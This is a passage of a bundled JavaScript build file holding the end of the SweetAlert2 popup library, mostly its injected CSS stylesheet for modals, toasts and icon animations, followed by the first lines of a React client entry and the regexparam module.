      SweetAlert.prototype.hideLoading = hideLoading;
      SweetAlert.prototype.disableLoading = hideLoading;
      SweetAlert.prototype.showValidationMessage = showValidationMessage;
      SweetAlert.prototype.resetValidationMessage = resetValidationMessage;
      SweetAlert.prototype.close = close;
      SweetAlert.prototype.closePopup = close;
      SweetAlert.prototype.closeModal = close;
      SweetAlert.prototype.closeToast = close;
      SweetAlert.prototype.rejectPromise = rejectPromise;
      SweetAlert.prototype.update = update;
      SweetAlert.prototype._destroy = _destroy;
      Object.assign(SweetAlert, staticMethods);
      Object.keys(instanceMethods).forEach((key) => {
        SweetAlert[key] = function(...args) {
          if (currentInstance && currentInstance[key]) {
            return currentInstance[key](...args);
          }
          return null;
        };
      });
      SweetAlert.DismissReason = DismissReason;
      SweetAlert.version = "11.22.2";
      const Swal8 = SweetAlert;
      Swal8.default = Swal8;
      return Swal8;
    });
    if (typeof exports !== "undefined" && exports.Sweetalert2) {
      exports.swal = exports.sweetAlert = exports.Swal = exports.SweetAlert = exports.Sweetalert2;
    }
    "undefined" != typeof document && function(e, t) {
      var n = e.createElement("style");
      if (e.getElementsByTagName("head")[0].appendChild(n), n.styleSheet) n.styleSheet.disabled || (n.styleSheet.cssText = t);
      else try {
        n.innerHTML = t;
      } catch (e2) {
        n.innerText = t;
      }
    }(document, ':root{--swal2-outline: 0 0 0 3px rgba(100, 150, 200, 0.5);--swal2-container-padding: 0.625em;--swal2-backdrop: rgba(0, 0, 0, 0.4);--swal2-backdrop-transition: background-color 0.1s;--swal2-width: 32em;--swal2-padding: 0 0 1.25em;--swal2-border: none;--swal2-border-radius: 0.3125rem;--swal2-background: white;--swal2-color: #545454;--swal2-show-animation: swal2-show 0.3s;--swal2-hide-animation: swal2-hide 0.15s forwards;--swal2-icon-zoom: 1;--swal2-icon-animations: true;--swal2-title-padding: 0.8em 1em 0;--swal2-html-container-padding: 1em 1.6em 0.3em;--swal2-input-border: 1px solid #d9d9d9;--swal2-input-border-radius: 0.1875em;--swal2-input-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.06), 0 0 0 3px transparent;--swal2-input-background: transparent;--swal2-input-transition: border-color 0.2s, box-shadow 0.2s;--swal2-input-hover-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.06), 0 0 0 3px transparent;--swal2-input-focus-border: 1px solid #b4dbed;--swal2-input-focus-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.06), 0 0 0 3px $swal2-outline-color;--swal2-progress-step-background: #add8e6;--swal2-validation-message-background: #f0f0f0;--swal2-validation-message-color: #666;--swal2-footer-border-color: #eee;--swal2-footer-background: transparent;--swal2-footer-color: inherit;--swal2-close-button-position: initial;--swal2-close-button-inset: auto;--swal2-close-button-font-size: 2.5em;--swal2-close-button-color: #ccc;--swal2-close-button-transition: color 0.2s, box-shadow 0.2s;--swal2-close-button-outline: initial;--swal2-close-button-box-shadow: inset 0 0 0 3px transparent;--swal2-close-button-focus-box-shadow: inset var(--swal2-outline);--swal2-close-button-hover-transform: none;--swal2-actions-justify-content: center;--swal2-actions-width: auto;--swal2-actions-margin: 1.25em auto 0;--swal2-actions-padding: 0;--swal2-actions-border-radius: 0;--swal2-actions-background: transparent;--swal2-action-button-transition: background-color 0.2s, box-shadow 0.2s;--swal2-action-button-hover: black 10%;--swal2-action-button-active: black 10%;--swal2-confirm-button-box-shadow: none;--swal2-confirm-button-border-radius: 0.25em;--swal2-confirm-button-background-color: #7066e0;--swal2-confirm-button-color: #fff;--swal2-deny-button-box-shadow: none;--swal2-deny-button-border-radius: 0.25em;--swal2-deny-button-background-color: #dc3741;--swal2-deny-button-color: #fff;--swal2-cancel-button-box-shadow: none;--swal2-cancel-button-border-radius: 0.25em;--swal2-cancel-button-background-color: #6e7881;--swal2-cancel-button-color: #fff;--swal2-toast-show-animation: swal2-toast-show 0.5s;--swal2-toast-hide-animation: swal2-toast-hide 0.1s forwards;--swal2-toast-border: none;--swal2-toast-box-shadow: 0 0 1px hsl(0deg 0% 0% / 0.075), 0 1px 2px hsl(0deg 0% 0% / 0.075), 1px 2px 4px hsl(0deg 0% 0% / 0.075), 1px 3px 8px hsl(0deg 0% 0% / 0.075), 2px 4px 16px hsl(0deg 0% 0% / 0.075)}[data-swal2-theme=dark]{--swal2-dark-theme-black: #19191a;--swal2-dark-theme-white: #e1e1e1;--swal2-background: var(--swal2-dark-theme-black);--swal2-color: var(--swal2-dark-theme-white);--swal2-footer-border-color: #555;--swal2-input-background: color-mix(in srgb, var(--swal2-dark-theme-black), var(--swal2-dark-theme-white) 10%);--swal2-validation-message-background: color-mix( in srgb, var(--swal2-dark-theme-black), var(--swal2-dark-theme-white) 10% );--swal2-validation-message-color: var(--swal2-dark-theme-white)}@media(prefers-color-scheme: dark){[data-swal2-theme=auto]{--swal2-dark-theme-black: #19191a;--swal2-dark-theme-white: #e1e1e1;--swal2-background: var(--swal2-dark-theme-black);--swal2-color: var(--swal2-dark-theme-white);--swal2-footer-border-color: #555;--swal2-input-background: color-mix(in srgb, var(--swal2-dark-theme-black), var(--swal2-dark-theme-white) 10%);--swal2-validation-message-background: color-mix( in srgb, var(--swal2-dark-theme-black), var(--swal2-dark-theme-white) 10% );--swal2-validation-message-color: var(--swal2-dark-theme-white)}}body.swal2-shown:not(.swal2-no-backdrop,.swal2-toast-shown){overflow:hidden}body.swal2-height-auto{height:auto !important}body.swal2-no-backdrop .swal2-container{background-color:rgba(0,0,0,0) !important;pointer-events:none}body.swal2-no-backdrop .swal2-container .swal2-popup{pointer-events:all}body.swal2-no-backdrop .swal2-container .swal2-modal{box-shadow:0 0 10px var(--swal2-backdrop)}body.swal2-toast-shown .swal2-container{box-sizing:border-box;width:360px;max-width:100%;background-color:rgba(0,0,0,0);pointer-events:none}body.swal2-toast-shown .swal2-container.swal2-top{inset:0 auto auto 50%;transform:translateX(-50%)}body.swal2-toast-shown .swal2-container.swal2-top-end,body.swal2-toast-shown .swal2-container.swal2-top-right{inset:0 0 auto auto}body.swal2-toast-shown .swal2-container.swal2-top-start,body.swal2-toast-shown .swal2-container.swal2-top-left{inset:0 auto auto 0}body.swal2-toast-shown .swal2-container.swal2-center-start,body.swal2-toast-shown .swal2-container.swal2-center-left{inset:50% auto auto 0;transform:translateY(-50%)}body.swal2-toast-shown .swal2-container.swal2-center{inset:50% auto auto 50%;transform:translate(-50%, -50%)}body.swal2-toast-shown .swal2-container.swal2-center-end,body.swal2-toast-shown .swal2-container.swal2-center-right{inset:50% 0 auto auto;transform:translateY(-50%)}body.swal2-toast-shown .swal2-container.swal2-bottom-start,body.swal2-toast-shown .swal2-container.swal2-bottom-left{inset:auto auto 0 0}body.swal2-toast-shown .swal2-container.swal2-bottom{inset:auto auto 0 50%;transform:translateX(-50%)}body.swal2-toast-shown .swal2-container.swal2-bottom-end,body.swal2-toast-shown .swal2-container.swal2-bottom-right{inset:auto 0 0 auto}@media print{body.swal2-shown:not(.swal2-no-backdrop,.swal2-toast-shown){overflow-y:scroll !important}body.swal2-shown:not(.swal2-no-backdrop,.swal2-toast-shown)>[aria-hidden=true]{display:none}body.swal2-shown:not(.swal2-no-backdrop,.swal2-toast-shown) .swal2-container{position:static !important}}div:where(.swal2-container){display:grid;position:fixed;z-index:1060;inset:0;box-sizing:border-box;grid-template-areas:"top-start     top            top-end" "center-start  center         center-end" "bottom-start  bottom-center  bottom-end";grid-template-rows:minmax(min-content, auto) minmax(min-content, auto) minmax(min-content, auto);height:100%;padding:var(--swal2-container-padding);overflow-x:hidden;transition:var(--swal2-backdrop-transition);-webkit-overflow-scrolling:touch}div:where(.swal2-container).swal2-backdrop-show,div:where(.swal2-container).swal2-noanimation{background:var(--swal2-backdrop)}div:where(.swal2-container).swal2-backdrop-hide{background:rgba(0,0,0,0) !important}div:where(.swal2-container).swal2-top-start,div:where(.swal2-container).swal2-center-start,div:where(.swal2-container).swal2-bottom-start{grid-template-columns:minmax(0, 1fr) auto auto}div:where(.swal2-container).swal2-top,div:where(.swal2-container).swal2-center,div:where(.swal2-container).swal2-bottom{grid-template-columns:auto minmax(0, 1fr) auto}div:where(.swal2-container).swal2-top-end,div:where(.swal2-container).swal2-center-end,div:where(.swal2-container).swal2-bottom-end{grid-template-columns:auto auto minmax(0, 1fr)}div:where(.swal2-container).swal2-top-start>.swal2-popup{align-self:start}div:where(.swal2-container).swal2-top>.swal2-popup{grid-column:2;place-self:start center}div:where(.swal2-container).swal2-top-end>.swal2-popup,div:where(.swal2-container).swal2-top-right>.swal2-popup{grid-column:3;place-self:start end}div:where(.swal2-container).swal2-center-start>.swal2-popup,div:where(.swal2-container).swal2-center-left>.swal2-popup{grid-row:2;align-self:center}div:where(.swal2-container).swal2-center>.swal2-popup{grid-column:2;grid-row:2;place-self:center center}div:where(.swal2-container).swal2-center-end>.swal2-popup,div:where(.swal2-container).swal2-center-right>.swal2-popup{grid-column:3;grid-row:2;place-self:center end}div:where(.swal2-container).swal2-bottom-start>.swal2-popup,div:where(.swal2-container).swal2-bottom-left>.swal2-popup{grid-column:1;grid-row:3;align-self:end}div:where(.swal2-container).swal2-bottom>.swal2-popup{grid-column:2;grid-row:3;place-self:end center}div:where(.swal2-container).swal2-bottom-end>.swal2-popup,div:where(.swal2-container).swal2-bottom-right>.swal2-popup{grid-column:3;grid-row:3;place-self:end end}div:where(.swal2-container).swal2-grow-row>.swal2-popup,div:where(.swal2-container).swal2-grow-fullscreen>.swal2-popup{grid-column:1/4;width:100%}div:where(.swal2-container).swal2-grow-column>.swal2-popup,div:where(.swal2-container).swal2-grow-fullscreen>.swal2-popup{grid-row:1/4;align-self:stretch}div:where(.swal2-container).swal2-no-transition{transition:none !important}div:where(.swal2-container)[popover]{width:auto;border:0}div:where(.swal2-container) div:where(.swal2-popup){display:none;position:relative;box-sizing:border-box;grid-template-columns:minmax(0, 100%);width:var(--swal2-width);max-width:100%;padding:var(--swal2-padding);border:var(--swal2-border);border-radius:var(--swal2-border-radius);background:var(--swal2-background);color:var(--swal2-color);font-family:inherit;font-size:1rem;container-name:swal2-popup}div:where(.swal2-container) div:where(.swal2-popup):focus{outline:none}div:where(.swal2-container) div:where(.swal2-popup).swal2-loading{overflow-y:hidden}div:where(.swal2-container) div:where(.swal2-popup).swal2-draggable{cursor:grab}div:where(.swal2-container) div:where(.swal2-popup).swal2-draggable div:where(.swal2-icon){cursor:grab}div:where(.swal2-container) div:where(.swal2-popup).swal2-dragging{cursor:grabbing}div:where(.swal2-container) div:where(.swal2-popup).swal2-dragging div:where(.swal2-icon){cursor:grabbing}div:where(.swal2-container) h2:where(.swal2-title){position:relative;max-width:100%;margin:0;padding:var(--swal2-title-padding);color:inherit;font-size:1.875em;font-weight:600;text-align:center;text-transform:none;word-wrap:break-word;cursor:initial}div:where(.swal2-container) div:where(.swal2-actions){display:flex;z-index:1;box-sizing:border-box;flex-wrap:wrap;align-items:center;justify-content:var(--swal2-actions-justify-content);width:var(--swal2-actions-width);margin:var(--swal2-actions-margin);padding:var(--swal2-actions-padding);border-radius:var(--swal2-actions-border-radius);background:var(--swal2-actions-background)}div:where(.swal2-container) div:where(.swal2-loader){display:none;align-items:center;justify-content:center;width:2.2em;height:2.2em;margin:0 1.875em;animation:swal2-rotate-loading 1.5s linear 0s infinite normal;border-width:.25em;border-style:solid;border-radius:100%;border-color:#2778c4 rgba(0,0,0,0) #2778c4 rgba(0,0,0,0)}div:where(.swal2-container) button:where(.swal2-styled){margin:.3125em;padding:.625em 1.1em;transition:var(--swal2-action-button-transition);border:none;box-shadow:0 0 0 3px rgba(0,0,0,0);font-weight:500}div:where(.swal2-container) button:where(.swal2-styled):not([disabled]){cursor:pointer}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-confirm){border-radius:var(--swal2-confirm-button-border-radius);background:initial;background-color:var(--swal2-confirm-button-background-color);box-shadow:var(--swal2-confirm-button-box-shadow);color:var(--swal2-confirm-button-color);font-size:1em}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-confirm):hover{background-color:color-mix(in srgb, var(--swal2-confirm-button-background-color), var(--swal2-action-button-hover))}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-confirm):active{background-color:color-mix(in srgb, var(--swal2-confirm-button-background-color), var(--swal2-action-button-active))}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-deny){border-radius:var(--swal2-deny-button-border-radius);background:initial;background-color:var(--swal2-deny-button-background-color);box-shadow:var(--swal2-deny-button-box-shadow);color:var(--swal2-deny-button-color);font-size:1em}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-deny):hover{background-color:color-mix(in srgb, var(--swal2-deny-button-background-color), var(--swal2-action-button-hover))}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-deny):active{background-color:color-mix(in srgb, var(--swal2-deny-button-background-color), var(--swal2-action-button-active))}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-cancel){border-radius:var(--swal2-cancel-button-border-radius);background:initial;background-color:var(--swal2-cancel-button-background-color);box-shadow:var(--swal2-cancel-button-box-shadow);color:var(--swal2-cancel-button-color);font-size:1em}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-cancel):hover{background-color:color-mix(in srgb, var(--swal2-cancel-button-background-color), var(--swal2-action-button-hover))}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-cancel):active{background-color:color-mix(in srgb, var(--swal2-cancel-button-background-color), var(--swal2-action-button-active))}div:where(.swal2-container) button:where(.swal2-styled):focus-visible{outline:none;box-shadow:var(--swal2-action-button-focus-box-shadow)}div:where(.swal2-container) button:where(.swal2-styled)[disabled]:not(.swal2-loading){opacity:.4}div:where(.swal2-container) button:where(.swal2-styled)::-moz-focus-inner{border:0}div:where(.swal2-container) div:where(.swal2-footer){margin:1em 0 0;padding:1em 1em 0;border-top:1px solid var(--swal2-footer-border-color);background:var(--swal2-footer-background);color:var(--swal2-footer-color);font-size:1em;text-align:center;cursor:initial}div:where(.swal2-container) .swal2-timer-progress-bar-container{position:absolute;right:0;bottom:0;left:0;grid-column:auto !important;overflow:hidden;border-bottom-right-radius:var(--swal2-border-radius);border-bottom-left-radius:var(--swal2-border-radius)}div:where(.swal2-container) div:where(.swal2-timer-progress-bar){width:100%;height:.25em;background:rgba(0,0,0,.2)}div:where(.swal2-container) img:where(.swal2-image){max-width:100%;margin:2em auto 1em;cursor:initial}div:where(.swal2-container) button:where(.swal2-close){position:var(--swal2-close-button-position);inset:var(--swal2-close-button-inset);z-index:2;align-items:center;justify-content:center;width:1.2em;height:1.2em;margin-top:0;margin-right:0;margin-bottom:-1.2em;padding:0;overflow:hidden;transition:var(--swal2-close-button-transition);border:none;border-radius:var(--swal2-border-radius);outline:var(--swal2-close-button-outline);background:rgba(0,0,0,0);color:var(--swal2-close-button-color);font-family:monospace;font-size:var(--swal2-close-button-font-size);cursor:pointer;justify-self:end}div:where(.swal2-container) button:where(.swal2-close):hover{transform:var(--swal2-close-button-hover-transform);background:rgba(0,0,0,0);color:#f27474}div:where(.swal2-container) button:where(.swal2-close):focus-visible{outline:none;box-shadow:var(--swal2-close-button-focus-box-shadow)}div:where(.swal2-container) button:where(.swal2-close)::-moz-focus-inner{border:0}div:where(.swal2-container) div:where(.swal2-html-container){z-index:1;justify-content:center;margin:0;padding:var(--swal2-html-container-padding);overflow:auto;color:inherit;font-size:1.125em;font-weight:normal;line-height:normal;text-align:center;word-wrap:break-word;word-break:break-word;cursor:initial}div:where(.swal2-container) input:where(.swal2-input),div:where(.swal2-container) input:where(.swal2-file),div:where(.swal2-container) textarea:where(.swal2-textarea),div:where(.swal2-container) select:where(.swal2-select),div:where(.swal2-container) div:where(.swal2-radio),div:where(.swal2-container) label:where(.swal2-checkbox){margin:1em 2em 3px}div:where(.swal2-container) input:where(.swal2-input),div:where(.swal2-container) input:where(.swal2-file),div:where(.swal2-container) textarea:where(.swal2-textarea){box-sizing:border-box;width:auto;transition:var(--swal2-input-transition);border:var(--swal2-input-border);border-radius:var(--swal2-input-border-radius);background:var(--swal2-input-background);box-shadow:var(--swal2-input-box-shadow);color:inherit;font-size:1.125em}div:where(.swal2-container) input:where(.swal2-input).swal2-inputerror,div:where(.swal2-container) input:where(.swal2-file).swal2-inputerror,div:where(.swal2-container) textarea:where(.swal2-textarea).swal2-inputerror{border-color:#f27474 !important;box-shadow:0 0 2px #f27474 !important}div:where(.swal2-container) input:where(.swal2-input):hover,div:where(.swal2-container) input:where(.swal2-file):hover,div:where(.swal2-container) textarea:where(.swal2-textarea):hover{box-shadow:var(--swal2-input-hover-box-shadow)}div:where(.swal2-container) input:where(.swal2-input):focus,div:where(.swal2-container) input:where(.swal2-file):focus,div:where(.swal2-container) textarea:where(.swal2-textarea):focus{border:var(--swal2-input-focus-border);outline:none;box-shadow:var(--swal2-input-focus-box-shadow)}div:where(.swal2-container) input:where(.swal2-input)::placeholder,div:where(.swal2-container) input:where(.swal2-file)::placeholder,div:where(.swal2-container) textarea:where(.swal2-textarea)::placeholder{color:#ccc}div:where(.swal2-container) .swal2-range{margin:1em 2em 3px;background:var(--swal2-background)}div:where(.swal2-container) .swal2-range input{width:80%}div:where(.swal2-container) .swal2-range output{width:20%;color:inherit;font-weight:600;text-align:center}div:where(.swal2-container) .swal2-range input,div:where(.swal2-container) .swal2-range output{height:2.625em;padding:0;font-size:1.125em;line-height:2.625em}div:where(.swal2-container) .swal2-input{height:2.625em;padding:0 .75em}div:where(.swal2-container) .swal2-file{width:75%;margin-right:auto;margin-left:auto;background:var(--swal2-input-background);font-size:1.125em}div:where(.swal2-container) .swal2-textarea{height:6.75em;padding:.75em}div:where(.swal2-container) .swal2-select{min-width:50%;max-width:100%;padding:.375em .625em;background:var(--swal2-input-background);color:inherit;font-size:1.125em}div:where(.swal2-container) .swal2-radio,div:where(.swal2-container) .swal2-checkbox{align-items:center;justify-content:center;background:var(--swal2-background);color:inherit}div:where(.swal2-container) .swal2-radio label,div:where(.swal2-container) .swal2-checkbox label{margin:0 .6em;font-size:1.125em}div:where(.swal2-container) .swal2-radio input,div:where(.swal2-container) .swal2-checkbox input{flex-shrink:0;margin:0 .4em}div:where(.swal2-container) label:where(.swal2-input-label){display:flex;justify-content:center;margin:1em auto 0}div:where(.swal2-container) div:where(.swal2-validation-message){align-items:center;justify-content:center;margin:1em 0 0;padding:.625em;overflow:hidden;background:var(--swal2-validation-message-background);color:var(--swal2-validation-message-color);font-size:1em;font-weight:300}div:where(.swal2-container) div:where(.swal2-validation-message)::before{content:"!";display:inline-block;width:1.5em;min-width:1.5em;height:1.5em;margin:0 .625em;border-radius:50%;background-color:#f27474;color:#fff;font-weight:600;line-height:1.5em;text-align:center}div:where(.swal2-container) .swal2-progress-steps{flex-wrap:wrap;align-items:center;max-width:100%;margin:1.25em auto;padding:0;background:rgba(0,0,0,0);font-weight:600}div:where(.swal2-container) .swal2-progress-steps li{display:inline-block;position:relative}div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step{z-index:20;flex-shrink:0;width:2em;height:2em;border-radius:2em;background:#2778c4;color:#fff;line-height:2em;text-align:center}div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step.swal2-active-progress-step{background:#2778c4}div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step.swal2-active-progress-step~.swal2-progress-step{background:var(--swal2-progress-step-background);color:#fff}div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step.swal2-active-progress-step~.swal2-progress-step-line{background:var(--swal2-progress-step-background)}div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step-line{z-index:10;flex-shrink:0;width:2.5em;height:.4em;margin:0 -1px;background:#2778c4}div:where(.swal2-icon){position:relative;box-sizing:content-box;justify-content:center;width:5em;height:5em;margin:2.5em auto .6em;zoom:var(--swal2-icon-zoom);border:.25em solid rgba(0,0,0,0);border-radius:50%;border-color:#000;font-family:inherit;line-height:5em;cursor:default;user-select:none}div:where(.swal2-icon) .swal2-icon-content{display:flex;align-items:center;font-size:3.75em}div:where(.swal2-icon).swal2-error{border-color:#f27474;color:#f27474}div:where(.swal2-icon).swal2-error .swal2-x-mark{position:relative;flex-grow:1}div:where(.swal2-icon).swal2-error [class^=swal2-x-mark-line]{display:block;position:absolute;top:2.3125em;width:2.9375em;height:.3125em;border-radius:.125em;background-color:#f27474}div:where(.swal2-icon).swal2-error [class^=swal2-x-mark-line][class$=left]{left:1.0625em;transform:rotate(45deg)}div:where(.swal2-icon).swal2-error [class^=swal2-x-mark-line][class$=right]{right:1em;transform:rotate(-45deg)}@container swal2-popup style(--swal2-icon-animations:true){div:where(.swal2-icon).swal2-error.swal2-icon-show{animation:swal2-animate-error-icon .5s}div:where(.swal2-icon).swal2-error.swal2-icon-show .swal2-x-mark{animation:swal2-animate-error-x-mark .5s}}div:where(.swal2-icon).swal2-warning{border-color:#f8bb86;color:#f8bb86}@container swal2-popup style(--swal2-icon-animations:true){div:where(.swal2-icon).swal2-warning.swal2-icon-show{animation:swal2-animate-error-icon .5s}div:where(.swal2-icon).swal2-warning.swal2-icon-show .swal2-icon-content{animation:swal2-animate-i-mark .5s}}div:where(.swal2-icon).swal2-info{border-color:#3fc3ee;color:#3fc3ee}@container swal2-popup style(--swal2-icon-animations:true){div:where(.swal2-icon).swal2-info.swal2-icon-show{animation:swal2-animate-error-icon .5s}div:where(.swal2-icon).swal2-info.swal2-icon-show .swal2-icon-content{animation:swal2-animate-i-mark .8s}}div:where(.swal2-icon).swal2-question{border-color:#87adbd;color:#87adbd}@container swal2-popup style(--swal2-icon-animations:true){div:where(.swal2-icon).swal2-question.swal2-icon-show{animation:swal2-animate-error-icon .5s}div:where(.swal2-icon).swal2-question.swal2-icon-show .swal2-icon-content{animation:swal2-animate-question-mark .8s}}div:where(.swal2-icon).swal2-success{border-color:#a5dc86;color:#a5dc86}div:where(.swal2-icon).swal2-success [class^=swal2-success-circular-line]{position:absolute;width:3.75em;height:7.5em;border-radius:50%}div:where(.swal2-icon).swal2-success [class^=swal2-success-circular-line][class$=left]{top:-0.4375em;left:-2.0635em;transform:rotate(-45deg);transform-origin:3.75em 3.75em;border-radius:7.5em 0 0 7.5em}div:where(.swal2-icon).swal2-success [class^=swal2-success-circular-line][class$=right]{top:-0.6875em;left:1.875em;transform:rotate(-45deg);transform-origin:0 3.75em;border-radius:0 7.5em 7.5em 0}div:where(.swal2-icon).swal2-success .swal2-success-ring{position:absolute;z-index:2;top:-0.25em;left:-0.25em;box-sizing:content-box;width:100%;height:100%;border:.25em solid rgba(165,220,134,.3);border-radius:50%}div:where(.swal2-icon).swal2-success .swal2-success-fix{position:absolute;z-index:1;top:.5em;left:1.625em;width:.4375em;height:5.625em;transform:rotate(-45deg)}div:where(.swal2-icon).swal2-success [class^=swal2-success-line]{display:block;position:absolute;z-index:2;height:.3125em;border-radius:.125em;background-color:#a5dc86}div:where(.swal2-icon).swal2-success [class^=swal2-success-line][class$=tip]{top:2.875em;left:.8125em;width:1.5625em;transform:rotate(45deg)}div:where(.swal2-icon).swal2-success [class^=swal2-success-line][class$=long]{top:2.375em;right:.5em;width:2.9375em;transform:rotate(-45deg)}@container swal2-popup style(--swal2-icon-animations:true){div:where(.swal2-icon).swal2-success.swal2-icon-show .swal2-success-line-tip{animation:swal2-animate-success-line-tip .75s}div:where(.swal2-icon).swal2-success.swal2-icon-show .swal2-success-line-long{animation:swal2-animate-success-line-long .75s}div:where(.swal2-icon).swal2-success.swal2-icon-show .swal2-success-circular-line-right{animation:swal2-rotate-success-circular-line 4.25s ease-in}}[class^=swal2]{-webkit-tap-highlight-color:rgba(0,0,0,0)}.swal2-show{animation:var(--swal2-show-animation)}.swal2-hide{animation:var(--swal2-hide-animation)}.swal2-noanimation{transition:none}.swal2-scrollbar-measure{position:absolute;top:-9999px;width:50px;height:50px;overflow:scroll}.swal2-rtl .swal2-close{margin-right:initial;margin-left:0}.swal2-rtl .swal2-timer-progress-bar{right:0;left:auto}.swal2-toast{box-sizing:border-box;grid-column:1/4 !important;grid-row:1/4 !important;grid-template-columns:min-content auto min-content;padding:1em;overflow-y:hidden;border:var(--swal2-toast-border);background:var(--swal2-background);box-shadow:var(--swal2-toast-box-shadow);pointer-events:all}.swal2-toast>*{grid-column:2}.swal2-toast h2:where(.swal2-title){margin:.5em 1em;padding:0;font-size:1em;text-align:initial}.swal2-toast .swal2-loading{justify-content:center}.swal2-toast input:where(.swal2-input){height:2em;margin:.5em;font-size:1em}.swal2-toast .swal2-validation-message{font-size:1em}.swal2-toast div:where(.swal2-footer){margin:.5em 0 0;padding:.5em 0 0;font-size:.8em}.swal2-toast button:where(.swal2-close){grid-column:3/3;grid-row:1/99;align-self:center;width:.8em;height:.8em;margin:0;font-size:2em}.swal2-toast div:where(.swal2-html-container){margin:.5em 1em;padding:0;overflow:initial;font-size:1em;text-align:initial}.swal2-toast div:where(.swal2-html-container):empty{padding:0}.swal2-toast .swal2-loader{grid-column:1;grid-row:1/99;align-self:center;width:2em;height:2em;margin:.25em}.swal2-toast .swal2-icon{grid-column:1;grid-row:1/99;align-self:center;width:2em;min-width:2em;height:2em;margin:0 .5em 0 0}.swal2-toast .swal2-icon .swal2-icon-content{display:flex;align-items:center;font-size:1.8em;font-weight:bold}.swal2-toast .swal2-icon.swal2-success .swal2-success-ring{width:2em;height:2em}.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line]{top:.875em;width:1.375em}.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=left]{left:.3125em}.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=right]{right:.3125em}.swal2-toast div:where(.swal2-actions){justify-content:flex-start;height:auto;margin:0;margin-top:.5em;padding:0 .5em}.swal2-toast button:where(.swal2-styled){margin:.25em .5em;padding:.4em .6em;font-size:1em}.swal2-toast .swal2-success{border-color:#a5dc86}.swal2-toast .swal2-success [class^=swal2-success-circular-line]{position:absolute;width:1.6em;height:3em;border-radius:50%}.swal2-toast .swal2-success [class^=swal2-success-circular-line][class$=left]{top:-0.8em;left:-0.5em;transform:rotate(-45deg);transform-origin:2em 2em;border-radius:4em 0 0 4em}.swal2-toast .swal2-success [class^=swal2-success-circular-line][class$=right]{top:-0.25em;left:.9375em;transform-origin:0 1.5em;border-radius:0 4em 4em 0}.swal2-toast .swal2-success .swal2-success-ring{width:2em;height:2em}.swal2-toast .swal2-success .swal2-success-fix{top:0;left:.4375em;width:.4375em;height:2.6875em}.swal2-toast .swal2-success [class^=swal2-success-line]{height:.3125em}.swal2-toast .swal2-success [class^=swal2-success-line][class$=tip]{top:1.125em;left:.1875em;width:.75em}.swal2-toast .swal2-success [class^=swal2-success-line][class$=long]{top:.9375em;right:.1875em;width:1.375em}@container swal2-popup style(--swal2-icon-animations:true){.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-tip{animation:swal2-toast-animate-success-line-tip .75s}.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-long{animation:swal2-toast-animate-success-line-long .75s}}.swal2-toast.swal2-show{animation:var(--swal2-toast-show-animation)}.swal2-toast.swal2-hide{animation:var(--swal2-toast-hide-animation)}@keyframes swal2-show{0%{transform:scale(0.7)}45%{transform:scale(1.05)}80%{transform:scale(0.95)}100%{transform:scale(1)}}@keyframes swal2-hide{0%{transform:scale(1);opacity:1}100%{transform:scale(0.5);opacity:0}}@keyframes swal2-animate-success-line-tip{0%{top:1.1875em;left:.0625em;width:0}54%{top:1.0625em;left:.125em;width:0}70%{top:2.1875em;left:-0.375em;width:3.125em}84%{top:3em;left:1.3125em;width:1.0625em}100%{top:2.8125em;left:.8125em;width:1.5625em}}@keyframes swal2-animate-success-line-long{0%{top:3.375em;right:2.875em;width:0}65%{top:3.375em;right:2.875em;width:0}84%{top:2.1875em;right:0;width:3.4375em}100%{top:2.375em;right:.5em;width:2.9375em}}@keyframes swal2-rotate-success-circular-line{0%{transform:rotate(-45deg)}5%{transform:rotate(-45deg)}12%{transform:rotate(-405deg)}100%{transform:rotate(-405deg)}}@keyframes swal2-animate-error-x-mark{0%{margin-top:1.625em;transform:scale(0.4);opacity:0}50%{margin-top:1.625em;transform:scale(0.4);opacity:0}80%{margin-top:-0.375em;transform:scale(1.15)}100%{margin-top:0;transform:scale(1);opacity:1}}@keyframes swal2-animate-error-icon{0%{transform:rotateX(100deg);opacity:0}100%{transform:rotateX(0deg);opacity:1}}@keyframes swal2-rotate-loading{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}@keyframes swal2-animate-question-mark{0%{transform:rotateY(-360deg)}100%{transform:rotateY(0)}}@keyframes swal2-animate-i-mark{0%{transform:rotateZ(45deg);opacity:0}25%{transform:rotateZ(-25deg);opacity:.4}50%{transform:rotateZ(15deg);opacity:.8}75%{transform:rotateZ(-5deg);opacity:1}100%{transform:rotateX(0);opacity:1}}@keyframes swal2-toast-show{0%{transform:translateY(-0.625em) rotateZ(2deg)}33%{transform:translateY(0) rotateZ(-2deg)}66%{transform:translateY(0.3125em) rotateZ(2deg)}100%{transform:translateY(0) rotateZ(0deg)}}@keyframes swal2-toast-hide{100%{transform:rotateZ(1deg);opacity:0}}@keyframes swal2-toast-animate-success-line-tip{0%{top:.5625em;left:.0625em;width:0}54%{top:.125em;left:.125em;width:0}70%{top:.625em;left:-0.25em;width:1.625em}84%{top:1.0625em;left:.75em;width:.5em}100%{top:1.125em;left:.1875em;width:.75em}}@keyframes swal2-toast-animate-success-line-long{0%{top:1.625em;right:1.375em;width:0}65%{top:1.25em;right:.9375em;width:0}84%{top:.9375em;right:0;width:1.125em}100%{top:.9375em;right:.1875em;width:1.375em}}');
  }
});

// client/src/main.tsx
import { createRoot } from "react-dom/client";

// node_modules/regexparam/dist/index.mjs
function parse(input, loose) {
  if (input instanceof RegExp) return { keys: false, pattern: input };
